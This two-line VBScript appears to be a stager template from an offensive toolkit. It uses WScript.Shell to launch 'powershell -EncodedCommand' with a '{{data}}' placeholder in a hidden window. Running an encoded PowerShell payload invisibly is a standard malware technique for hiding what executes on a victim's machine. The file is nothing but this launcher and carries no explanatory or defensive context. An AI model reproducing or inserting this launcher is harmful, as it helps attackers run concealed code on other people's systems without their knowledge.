Set sh = WScript.CreateObject("WScript.Shell")
sh.Run "powershell -EncodedCommand ""{{data}}""", 0, True